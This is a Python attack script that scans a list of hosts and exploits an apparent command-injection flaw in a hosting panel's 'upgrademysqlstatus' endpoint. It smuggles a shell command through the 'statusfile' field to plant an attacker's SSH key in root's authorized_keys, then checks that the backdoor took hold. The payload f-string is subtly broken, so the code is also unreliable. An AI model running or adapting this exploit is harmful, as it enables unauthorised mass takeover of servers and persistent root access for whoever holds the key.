#!/usr/bin/env python3
import sys,json,re,requests,urllib3
urllib3.disable_warnings()
UA={"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) Chrome/126 Safari/537.36"}
CMD="mkdir -p /root/.ssh && chmod 700 /root/.ssh && (grep -qF 'kops@base' /root/.ssh/authorized_keys 2>/dev/null || echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII8pgh3fkk8mhhHbMQKrwLOlblRqPZ/jx7Np5LzIhtZz kops@base' >> /root/.ssh/authorized_keys) && chmod 600 /root/.ssh/authorized_keys && echo INSTALLED"
def rce(host,cmd,scheme="https"):
    base=f"{scheme}://{host}"
    s=requests.Session(); s.verify=False; s.headers.update(UA)
    r=s.get(base+"/",timeout=15,allow_redirects=False)
    m=re.search(r"csrftoken=([A-Za-z0-9]+)",str(r.headers))
    tok=m.group(1) if m else s.cookies.get("csrftoken")
    if not tok:
        s.get(base+"/login/",timeout=15); tok=s.cookies.get("csrftoken")
    if not tok: return None
    p={"statusfile":f"/dev/null; {{cmd}}; #","csrftoken":tok}
    e=s.put(base+"/dataBases/upgrademysqlstatus",json=p,timeout=15,
            headers={"X-CSRFToken":tok,"Content-Type":"application/json","Referer":base+"/"})
    return e.text
for line in open(sys.argv[1]):
    h=line.strip()
    if not h: continue
    out={"host":h}
    try:
        t=rce(h,CMD) or ""
        out["installed"]="INSTALLED" in t
        out["snip"]=re.sub(r"[^\x20-\x7e]","",t)[:200]
        v=rce(h,"id; ls -l /root/.ssh/authorized_keys 2>&1 | head -2") or ""
        out["verify"]=re.sub(r"[^\x20-\x7e]","",v)[:220]
    except Exception as e:
        out["err"]=str(e)[:70]
    print(json.dumps(out),flush=True)
